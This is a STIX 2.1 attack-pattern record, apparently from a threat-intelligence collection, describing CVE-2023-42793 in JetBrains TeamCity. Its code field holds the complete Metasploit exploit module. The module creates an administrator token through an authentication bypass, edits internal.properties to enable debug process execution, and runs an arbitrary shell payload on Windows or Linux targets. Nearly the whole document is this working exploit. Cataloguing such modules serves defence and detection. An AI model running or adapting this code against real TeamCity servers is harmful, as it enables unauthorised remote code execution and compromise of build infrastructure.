{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--93d3c416-8fbb-4ca8-a992-b9a3bf87f388",
    "created": "2024-08-14T17:09:29.248275Z",
    "modified": "2024-08-14T17:09:29.248279Z",
    "name": "JetBrains TeamCity Unauthenticated Remote Code Execution",
    "description": " This module exploits an authentication bypass vulnerability to achieve unauthenticated remote code execution against a vulnerable JetBrains TeamCity server. All versions of TeamCity prior to version 2023.05.4 are vulnerable to this issue. The vulnerability was originally discovered by SonarSource.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/jetbrains_teamcity_rce_cve_2023_42793.rb",
            "external_id": "jetbrains_teamcity_rce_cve_2023_42793.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-42793"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/1XEEEkGHzt/cve-2023-42793/rapid7-analysis"
        },
        {
            "source_name": "reference",
            "url": "https://blog.jetbrains.com/teamcity/2023/09/critical-security-issue-affecting-teamcity-on-premises-update-to-2023-05-4-now/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Retry\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'JetBrains TeamCity Unauthenticated Remote Code Execution',\n        'Description' => %q{\n          This module exploits an authentication bypass vulnerability to achieve unauthenticated remote code execution\n          against a vulnerable JetBrains TeamCity server. All versions of TeamCity prior to version 2023.05.4 are\n          vulnerable to this issue. The vulnerability was originally discovered by SonarSource.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'sfewer-r7', # MSF Exploit & Rapid7 Analysis\n        ],\n        'References' => [\n          ['CVE', '2023-42793'],\n          ['URL', 'https://attackerkb.com/topics/1XEEEkGHzt/cve-2023-42793/rapid7-analysis'],\n          ['URL', 'https://blog.jetbrains.com/teamcity/2023/09/critical-security-issue-affecting-teamcity-on-premises-update-to-2023-05-4-now/']\n        ],\n        'DisclosureDate' => '2023-09-19',\n        'Platform' => %w[win linux],\n        'Arch' => [ARCH_CMD],\n        'Payload' => { 'Space' => 1024 },\n        'Privileged' => false, # TeamCity may be installed to run as local system/root, or it may be run as a custom user account.\n        'Targets' => [\n          [\n            'Windows',\n            {\n              'Platform' => 'win'\n            }\n          ],\n          [\n            'Linux',\n            {\n              'Platform' => 'linux'\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options(\n      [\n        # By default TeamCity listens for HTTP requests on TCP port 8111.\n        Opt::RPORT(8111),\n        # The first user created during installation is an administrator account, so the ID will be 1.\n        OptInt.new('TEAMCITY_ADMIN_ID', [true, 'The ID of an administrator account to authenticate as', 1]),\n        # We modify a configuration file, we need to wait for the changes to be picked up. These options govern how we wait.\n        OptInt.new('TEAMCITY_CHANGE_TIMEOUT', [true, 'The timeout to wait for the changes to be applied', 30])\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => '/login.html'\n    )\n\n    return CheckCode::Unknown('Connection failed') unless res\n\n    # We expect a TeamCity server to respond with either a \"TeamCity-Node-Id\" header value or a cookie named \"TCSESSIONID\".\n    # In the responses HTML body will be a string containing the release name and build version.\n    if (res.headers.key?('TeamCity-Node-Id') || res.get_cookies.include?('TCSESSIONID')) && (res.body =~ /(\\d+\\.\\d+\\.\\d+) \\(build (\\d+)\\)/)\n      detected = \"JetBrains TeamCity #{::Regexp.last_match(1)} (build #{::Regexp.last_match(2)}) detected.\"\n\n      # The vulnerability was patched in release 2023.05.4 (build 129421) so anything before this build is vulnerable.\n      if ::Regexp.last_match(2).to_i < 129421\n        return CheckCode::Vulnerable(detected)\n      end\n\n      return CheckCode::Safe(detected)\n    end\n\n    CheckCode::Unknown\n  end\n\n  def exploit\n    token_uri = \"/app/rest/users/id:#{datastore['TEAMCITY_ADMIN_ID']}/tokens/RPC2\"\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(token_uri)\n    )\n\n    # A token named 'RPC2' may already exist if this system has been exploited before and previous exploitation\n    # did not delete teh token after use. We detect that here, delete the token (as we dont know its value) if required\n    # and then proceed to create a new token for our use.\n    if res && (res.code == 400) && res.body.include?('Token already exists')\n\n      print_status('Token already exists, deleting and generating a new one.')\n\n      unless delete_token(token_uri)\n        fail_with(Failure::UnexpectedReply, 'Failed to delete the authentication token.')\n      end\n\n      res = send_request_cgi(\n        'method' => 'POST',\n        'uri' => normalize_uri(token_uri)\n      )\n    end\n\n    unless res&.code == 200\n      # One reason token creation may fail is if we use a user ID for a user that does not exist. We detect that here\n      # and instruct the user to choose a new ID via the TEAMCITY_ADMIN_ID option.\n      if res && (res.code == 404) && res.body.include?('User not found')\n        print_warning('User not found, try setting the TEAMCITY_ADMIN_ID option to a different ID.')\n      end\n\n      fail_with(Failure::UnexpectedReply, 'Failed to create an authentication token.')\n    end\n\n    begin\n      token = Nokogiri::XML(res.body).xpath('/token')&.attr('value').to_s\n\n      print_status(\"Created authentication token: #{token}\")\n\n      print_status('Modifying internal.properties to allow process creation...')\n\n      unless modify_internal_properties(token, 'rest.debug.processes.enable', 'true')\n        fail_with(Failure::UnexpectedReply, 'Failed to modify the internal.properties config file.')\n      end\n\n      begin\n        print_status('Executing payload...')\n\n        vars_get = {}\n\n        # We need to supply multiple params with the same name, so the TeamCity server (A Java Spring framework) can\n        # construct a List<String> sequence for multiple parameters. We can do this be enabling `compare_by_identity`\n        # in the Ruby Hash.\n        vars_get.compare_by_identity\n\n        case target['Platform']\n        when 'win'\n          vars_get['exePath'] = 'cmd.exe'\n          vars_get['params'] = '/c'\n          vars_get['params'] = payload.encoded\n        when 'linux'\n          vars_get['exePath'] = '/bin/sh'\n          vars_get['params'] = '-c'\n          vars_get['params'] = payload.encoded\n        end\n\n        res = send_request_cgi(\n          'method' => 'POST',\n          'uri' => normalize_uri('/app/rest/debug/processes'),\n          'uri_encode_mode' => 'hex-all', # we must encode all characters in the query param for the payload to work.\n          'headers' => {\n            'Authorization' => \"Bearer #{token}\",\n            'Content-Type' => 'text/plain'\n          },\n          'vars_get' => vars_get\n        )\n\n        unless res&.code == 200\n          fail_with(Failure::UnexpectedReply, 'Failed to execute arbitrary process.')\n        end\n      ensure\n        print_status('Resetting the internal.properties settings...')\n\n        unless modify_internal_properties(token, 'rest.debug.processes.enable', nil)\n          fail_with(Failure::UnexpectedReply, 'Failed to modify the internal.properties config file.')\n        end\n      end\n    ensure\n      print_status('Deleting the authentication token.')\n\n      unless delete_token(token_uri)\n        fail_with(Failure::UnexpectedReply, 'Failed to delete the authentication token.')\n      end\n    end\n  end\n\n  def delete_token(token_uri)\n    res = send_request_cgi(\n      'method' => 'DELETE',\n      'uri' => normalize_uri(token_uri),\n      'headers' => {\n        'Connection' => 'close'\n      }\n    )\n\n    res&.code == 204\n  end\n\n  def modify_internal_properties(token, key, value)\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri('/admin/dataDir.html'),\n      'headers' => {\n        'Authorization' => \"Bearer #{token}\"\n      },\n      'vars_get' => {\n        'action' => 'edit',\n        'fileName' => 'config/internal.properties',\n        'content' => value ? \"#{key}=#{value}\" : ''\n      }\n    )\n\n    unless res&.code == 200\n      # If we are using an authentication for a non admin user, we cannot modify the internal.properties file. The\n      # server will return a 302 redirect if this is the case. Choose a different TEAMCITY_ADMIN_ID and try again.\n      if res&.code == 302\n        print_warning('This user is not an administrator, try setting the TEAMCITY_ADMIN_ID option to a different ID.')\n      end\n\n      return false\n    end\n\n    print_status('Waiting for configuration change to be applied...')\n    retry_until_truthy(timeout: datastore['TEAMCITY_CHANGE_TIMEOUT']) do\n      res = send_request_cgi(\n        'method' => 'GET',\n        'uri' => normalize_uri('/admin/admin.html'),\n        'headers' => {\n          'Authorization' => \"Bearer #{token}\",\n          'Accept' => '*/*'\n        },\n        'vars_get' => {\n          'item' => 'diagnostics',\n          'tab' => 'properties'\n        }\n      )\n\n      res&.code == 200 && res.body.include?(key)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-09-19",
    "x_mitre_platforms": [
        "linux"
    ]
}